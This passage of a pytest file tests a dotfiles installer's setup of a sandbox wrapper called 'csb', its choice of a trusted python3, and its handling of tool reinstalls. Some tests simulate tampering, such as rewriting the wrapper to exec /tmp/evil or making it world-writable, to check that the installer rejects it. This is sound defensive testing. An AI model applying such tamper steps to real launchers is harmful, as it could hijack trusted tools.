    steps (a new macOS has no usable /usr/bin/python3 until the Command Line
    Tools are in), not by create_symlinks. `backup_dir` is create_symlinks's
    global: set here the way it is by the time main() gets to this step.
    """

    RUN = 'backup_dir="$HOME/.dotfiles_backup_csb"; _link_sandbox_cli </dev/null'

    @staticmethod
    def _python(shell_env, extra=""):
        """python3 on PATH (a pyenv shim, say): logs that it ran. It must not."""
        log = shell_env.home.parent / "python3-cwd.log"
        shell_env.stub(
            "python3", body=f'pwd >> "{log}"\n{extra}exec "{sys.executable}" "$@"'
        )
        return log

    @staticmethod
    def _trusted():
        sys.path.insert(0, str(REPO_ROOT / ".claude" / "hooks"))
        import _sandbox_gate as gate

        found = gate.trusted_python()
        if found is None:
            pytest.skip("no trusted system python3 on this machine")
        return found

    @classmethod
    def _expected(cls, home):
        python = cls._trusted()
        import _sandbox_gate as gate

        return gate.csb_wrapper_text(python, str(home))

    def test_csb_is_the_fixed_wrapper(self, shell_env):
        home = shell_env.home
        log = self._python(shell_env)
        res, failures = run_recording(self.RUN, shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == []
        csb = home / ".local/bin/csb"
        assert csb.is_file() and not csb.is_symlink()
        assert stat.S_IMODE(csb.stat().st_mode) == 0o755
        assert csb.read_text(encoding="ascii") == self._expected(home)
        # PATH's python3 (a pyenv shim would follow .python-version) never ran
        assert not log.exists()
        assert "Installed csb" in res.stdout

    def test_it_runs_the_sandbox_cli(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        self._python(shell_env)
        # the order main() runs them in: the ~/.claude/hooks link the wrapper
        # goes through exists by the time csb is written
        both = run_sourced("create_symlinks </dev/null\n" + self.RUN, shell_env.env)
        assert both.returncode == 0, both.stdout + both.stderr
        res = subprocess.run(
            [str(home / ".local/bin/csb"), "--help"],
            capture_output=True,
            text=True,
            env=shell_env.env,
            timeout=60,
        )
        assert res.returncode == 0 and "usage: csb" in res.stdout

    def test_dry_run_writes_nothing(self, shell_env):
        home = shell_env.home
        self._python(shell_env)
        res = run_sourced(self.RUN, {**shell_env.env, "DRY_RUN": "1"})
        assert res.returncode == 0, res.stderr
        assert f"[DRY-RUN] would write {home}/.local/bin/csb" in res.stdout
        assert list(home.iterdir()) == []

    def test_a_rerun_leaves_the_wrapper_alone(self, shell_env):
        home = shell_env.home
        self._python(shell_env)
        assert run_sourced(self.RUN, shell_env.env).returncode == 0
        before = (home / ".local/bin/csb").stat()
        res = run_sourced(self.RUN, shell_env.env)
        assert "Already installed csb" in res.stdout
        after = (home / ".local/bin/csb").stat()
        assert (before.st_ino, before.st_mtime_ns) == (after.st_ino, after.st_mtime_ns)

    def test_a_rerun_repairs_a_wrapper_the_hook_would_reject(self, shell_env):
        # Same bytes, but group-writable: bash-review never trusts it, so "Already
        # installed" would leave csb failing closed for good.
        home = shell_env.home
        self._python(shell_env)
        assert run_sourced(self.RUN, shell_env.env).returncode == 0
        csb = home / ".local/bin/csb"
        csb.chmod(0o775)
        res = run_sourced(self.RUN, shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "Already installed csb" not in res.stdout
        assert stat.S_IMODE(csb.stat().st_mode) == 0o755
        assert csb.read_text() == self._expected(home)

    def test_an_old_symlink_is_replaced_and_recorded(self, shell_env):
        home = shell_env.home
        self._python(shell_env)
        (home / ".local/bin").mkdir(parents=True)
        old = f"{home}/.claude/hooks/claude_sandbox.py"
        (home / ".local/bin/csb").symlink_to(old)
        res = run_sourced(self.RUN, shell_env.env)
        assert res.returncode == 0, res.stderr
        csb = home / ".local/bin/csb"
        assert not csb.is_symlink() and csb.read_text() == self._expected(home)
        (record,) = home.glob(".dotfiles_backup_*/symlinks.txt")
        assert f"{csb} -> {old}" in record.read_text()

    def test_a_real_file_in_the_way_is_backed_up(self, shell_env):
        home = shell_env.home
        self._python(shell_env)
        (home / ".local/bin").mkdir(parents=True)
        (home / ".local/bin/csb").write_text("#!/bin/sh\necho mine\n", encoding="utf-8")
        res = run_sourced(self.RUN, shell_env.env)
        assert res.returncode == 0, res.stderr
        assert (home / ".local/bin/csb").read_text() == self._expected(home)
        backed = list(home.glob(".dotfiles_backup_*/.local/bin/csb"))
        assert len(backed) == 1 and "mine" in backed[0].read_text(encoding="utf-8")

    def test_a_failed_move_leaves_the_old_wrapper_in_place(self, shell_env):
        # backup_if_real MOVED the old file away before the rename; if the
        # rename then failed, csb was gone altogether.
        home = shell_env.home
        self._python(shell_env)
        (home / ".local/bin").mkdir(parents=True)
        mine = home / ".local/bin/csb"
        mine.write_text("#!/bin/sh\necho mine\n", encoding="utf-8")
        res, failures = run_recording(
            _mv_fails_onto("*/.local/bin/csb") + self.RUN, shell_env.env
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert "csb wrapper" in failures
        assert mine.read_text(encoding="utf-8") == "#!/bin/sh\necho mine\n"
        (kept,) = home.glob(".dotfiles_backup_*/.local/bin/csb")
        assert "mine" in kept.read_text(encoding="utf-8")
        assert [p.name for p in (home / ".local/bin").glob(".csb.*")] == []

    def test_create_symlinks_leaves_csb_to_the_later_step(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        log = self._python(shell_env)
        res, failures = run_recording("create_symlinks </dev/null", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == []
        assert not os.path.lexists(home / ".local/bin/csb")
        assert "csb" not in res.stdout and not log.exists()

    def test_main_runs_it_after_the_package_steps(self, shell_env):
        out = run_sourced(_STUB_MAIN_STEPS + "main", shell_env.env).stdout
        order = [
            out.index(f"STEP_{s}")
            for s in (
                "install_os_packages",
                "register_claude_mcp_servers",
                "_link_sandbox_cli",
                "link_oh_my_zsh_theme",
            )
        ]
        assert order == sorted(order), out

    def test_main_still_previews_it_in_a_dry_run(self, shell_env):
        out = run_sourced(_STUB_MAIN_STEPS + "main --dry-run", shell_env.env).stdout
        assert out.index("Skipping package and tool installation") < out.index(
            "STEP__link_sandbox_cli"
        )
        assert "STEP_install_os_packages" not in out

    def _macos(self, shell_env, clt_exit):
        """OS=macos snippet prefix; the system python3 launcher is replaced by
        one that leaves a mark, since starting a real /usr/bin/python3 without
        the Command Line Tools is what pops the installer dialog."""
        shell_env.stub("xcode-select", exit_code=clt_exit)
        return 'OS=macos; _as_hook_python() { touch "$HOME/python-ran"; return 1; }; '

    @pytest.mark.parametrize("dry_run", ["", "DRY_RUN=1; "])
    def test_macos_without_the_command_line_tools_never_starts_python(
        self, shell_env, dry_run
    ):
        home = shell_env.home
        res, failures = run_recording(
            self._macos(shell_env, 2) + dry_run + self.RUN, shell_env.env
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert not (home / "python-ran").exists()
        assert "xcode-select -p" in "\n".join(shell_env.calls)
        assert "xcode-select --install" in res.stdout
        assert "re-run ./install.sh" in res.stdout
        # a "not yet", not a failure: the Tools arrive with the Homebrew step
        assert failures == []
        assert not os.path.lexists(home / ".local/bin/csb")

    def test_macos_with_the_command_line_tools_goes_on(self, shell_env):
        # `xcode-select -p` succeeds: the guard steps aside, the real picker runs
        shell_env.stub("xcode-select", exit_code=0)
        res, failures = run_recording("OS=macos; " + self.RUN, shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == []
        assert (shell_env.home / ".local/bin/csb").is_file()
        assert "Installed csb" in res.stdout

    def test_linux_never_asks_xcode_select(self, shell_env):
        shell_env.stub("xcode-select", exit_code=2)
        res, failures = run_recording("OS=ubuntu; " + self.RUN, shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == []
        assert not [c for c in shell_env.calls if c.startswith("xcode-select")]
        assert (shell_env.home / ".local/bin/csb").is_file()

    @pytest.mark.parametrize(
        "tamper",
        [
            "printf '# appended\\n' >> \"$dest\"",
            'printf \'#!/bin/sh\\nexec /tmp/evil "$@"\\n\' > "$dest"',
            'chmod 0777 "$dest"',
        ],
    )
    def test_the_wrapper_is_checked_again_after_it_is_moved(self, shell_env, tamper):
        # Something rewriting the file between the write and the move (or right after
        # it) must not leave an untrusted wrapper behind: it is removed and recorded.
        home = shell_env.home
        self._python(shell_env)
        snippet = (
            'mv() { command mv "$@" || return; local dest="${!#}"; '
            'case "$dest" in */.local/bin/csb) ' + tamper + " ;; esac; }; " + self.RUN
        )
        res, failures = run_recording(snippet, shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert "csb wrapper" in failures
        assert not os.path.lexists(home / ".local/bin/csb")

    def test_a_broken_path_python3_does_not_matter(self, shell_env):
        home = shell_env.home
        shell_env.stub("python3", exit_code=1)
        (home / ".python-version").write_text("evil\n")
        res, failures = run_recording(self.RUN, shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert failures == []
        assert (home / ".local/bin/csb").read_text() == self._expected(home)
        assert not any(c.startswith("python3") for c in shell_env.calls)

    def test_no_trusted_python3_is_recorded(self, shell_env):
        home = shell_env.home
        self._python(shell_env)
        snippet = "_hook_python_pick() { return 1; }; " + self.RUN
        res, failures = run_recording(snippet, shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert "csb wrapper" in failures
        assert "No trusted system python3" in res.stdout + res.stderr
        assert not os.path.lexists(home / ".local/bin/csb")

    def test_install_picks_what_the_launchers_pick(self, shell_env):
        # one rule (the launchers' _trusted_python), so the hook's sys.executable
        # is the wrapper's interpreter
        res = run_sourced("_as_hook_python _hook_python_pick", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert res.stdout.strip() == self._trusted()

    def test_the_interpreter_runs_without_the_launch_variables(self, shell_env):
        self._trusted()
        import _sandbox_gate as gate

        env = {**shell_env.env, **{k: "/evil" for k in gate.LAUNCH_ENV_DROP}}
        res = run_sourced(
            "_as_hook_python env",
            env,
        )
        assert res.returncode == 0, res.stderr
        names = {line.split("=", 1)[0] for line in res.stdout.splitlines()}
        assert not names & set(gate.LAUNCH_ENV_DROP)

    def test_an_interpreter_path_the_wrapper_cannot_hold_is_recorded(self, shell_env):
        home = shell_env.home
        # A real interpreter at a path with a space: the wrapper single-quotes the
        # path and does not try to escape anything, so this is refused, not written.
        odd = shell_env.home.parent / "my python"
        odd.mkdir()
        (odd / "python3").symlink_to(self._trusted())
        snippet = (
            f"_hook_python_pick() {{ printf '%s\\n' '{odd}/python3'; }}; " + self.RUN
        )
        res, failures = run_recording(snippet, shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert "csb wrapper" in failures
        assert not os.path.lexists(home / ".local/bin/csb")

    def test_the_next_steps_describe_what_csb_does(self, shell_env):
        text = INSTALL.read_text(encoding="utf-8")
        assert "runs Claude Code in a Docker sandbox" not in text


class TestToolsAreNotReinstalledOnARerun:
    """pip --user tools living outside PATH, and the npm AI CLIs, are
    detected as installed instead of being reinstalled on every run."""

    PIP_TOOLS = ("ruff", "bandit", "mypy", "autopep8", "isort")

    def _pip_installs(self, shell_env):
        return [c for c in shell_env.calls if c.startswith("pip3 install")]

    def _hide_pip_tools(self, shell_env):
        for tool in self.PIP_TOOLS:
            shell_env.hide(tool)

    def test_tools_in_the_pip_user_bin_are_found(self, shell_env, tmp_path):
        # macOS: pip --user puts scripts in ~/Library/Python/X.Y/bin, which is
        # on no PATH while install.sh runs.
        self._hide_pip_tools(shell_env)
        base = tmp_path / "Library/Python/3.13"
        (base / "bin").mkdir(parents=True)
        for tool in self.PIP_TOOLS:
            exe = base / "bin" / tool
            exe.write_text("#!/bin/sh\n", encoding="utf-8")
            exe.chmod(0o755)
        shell_env.stub(
            "python3", body=f'[ "$*" = "-m site --user-base" ] && echo "{base}"'
        )
        shell_env.stub("pip3", body='[ "$1" = show ] && exit 1\nexit 0')
        res, failures = run_recording(
            "OS=windows install_linters_formatters", shell_env.env
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert self._pip_installs(shell_env) == []
        assert failures == []

    def test_tools_pip_reports_installed_are_not_reinstalled(self, shell_env):
        self._hide_pip_tools(shell_env)
        shell_env.stub("python3", body="exit 1")
        shell_env.stub("pip3", body='[ "$1" = show ] && exit 0\nexit 0')
        res, _ = run_recording("OS=windows install_linters_formatters", shell_env.env)
        assert self._pip_installs(shell_env) == []

    def test_missing_tools_are_still_installed(self, shell_env):
        self._hide_pip_tools(shell_env)
        shell_env.stub("python3", body="exit 1")
        shell_env.stub("pip3", body='[ "$1" = show ] && exit 1\nexit 0')
        res, _ = run_recording("OS=windows install_linters_formatters", shell_env.env)
        assert self._pip_installs(shell_env) == [
            f"pip3 install --user {tool}" for tool in self.PIP_TOOLS
        ]

    AI_CLIS = {
        "claude": "@anthropic-ai/claude-code",
        "codex": "@openai/codex",
        "gemini": "@google/gemini-cli",
        "copilot": "@github/copilot",
    }

    def test_installed_ai_clis_are_not_reinstalled(self, shell_env):
        for cmd in self.AI_CLIS:
            shell_env.stub(cmd)
        res, failures = run_recording("_install_ai_cli_tools", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert not [c for c in shell_env.calls if c.startswith("npm install")]
        assert failures == []

    def test_missing_ai_clis_are_installed(self, shell_env):
        res, failures = run_recording(
            _absent(*self.AI_CLIS) + "_install_ai_cli_tools", shell_env.env
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert [c for c in shell_env.calls if c.startswith("npm install")] == [
            f"npm install -g {pkg}" for pkg in self.AI_CLIS.values()
        ]
        assert failures == []


class TestDockerGuidanceInMain:
    def test_next_steps_cover_docker(self, shell_env):
        res = run_sourced(_STUB_MAIN_STEPS + "main", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        steps = res.stdout[res.stdout.index("Next steps:") :]
        assert "docker info" in steps
        assert "Docker Desktop" in steps
        assert "newgrp docker" in steps

    def test_dry_run_lists_the_new_install_steps(self, shell_env):
        res = run_sourced("main --dry-run", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "hadolint" in res.stdout
